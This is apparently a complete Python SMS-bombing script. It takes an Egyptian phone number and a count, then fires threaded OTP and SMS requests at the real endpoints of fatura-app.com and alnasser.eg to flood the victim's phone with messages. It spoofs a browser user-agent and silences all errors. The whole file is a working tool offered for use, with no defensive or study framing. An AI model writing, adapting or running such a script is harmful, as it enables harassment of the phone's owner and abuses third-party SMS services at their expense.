#FIII
import requests
import threading

# Function to validate and get the phone number
def get_valid_phone_number():
    while True:
        print('Dev By Ghalwash')
        phone = input("Phone Number without +2: ")
        if phone.startswith(('010', '011', '012', '015')) and len(phone) == 11:
            return phone
        else:
            print("Error: Invalid phone number. Please try again.")

# Function to get the number of requests (SMS)
def get_request_count():
    while True:
        try:
            count = int(input("Sms Number: "))
            if count > 0:
                return count
            else:
                print("Error: Please enter a positive integer.")
        except ValueError:
            print("Error: Please enter a valid number.")
        except Exception as e:
            print(f"An error occurred while getting request count: {e}")

# Function to send POST request to fatura-app.com
def send_post_request(phone, index):
    url = "https://fatura-app.com/auth/otp/send"
    payload = {
        "type": "login",
        "phone": phone,
        "otp": None
    }
    
    try:
        requests.post(url, json=payload)
    except requests.RequestException:
        pass  # Ignore all errors and do not print anything

# Function to send GET request to alnasser.eg
def send_get_request(phone, index):
    url = "https://www.alnasser.eg/ar/sendSMS"
    headers = {
        "cache-control": "no-cache, private",
        "connection": "Keep-Alive",
        "content-encoding": "gzip",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
        "x-requested-with": "XMLHttpRequest",
    }
    
    params = {
        "phone": phone
    }
    
    try:
        requests.get(url, headers=headers, params=params)
    except requests.RequestException:
        pass  # Ignore all errors and do not print anything

# Main function that handles both requests
def main(phone, count):
    threads = []

    # Create threads for sending POST requests to fatura-app.com
    for i in range(count):
        thread = threading.Thread(target=send_post_request, args=(phone, i))
        threads.append(thread)
        thread.start()

    # Create threads for sending GET requests to alnasser.eg
    for i in range(count):
        thread = threading.Thread(target=send_get_request, args=(phone, i))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()  # Ensure all threads complete

    print("All SMS requests have been processed!")  # Print only after all requests are done

# Entry point of the script
if __name__ == "__main__":
    phone_number = get_valid_phone_number()  # Get the phone number
    request_count = get_request_count()  # Get the number of requests
    
    main(phone_number, request_count)  # Start the process with threads
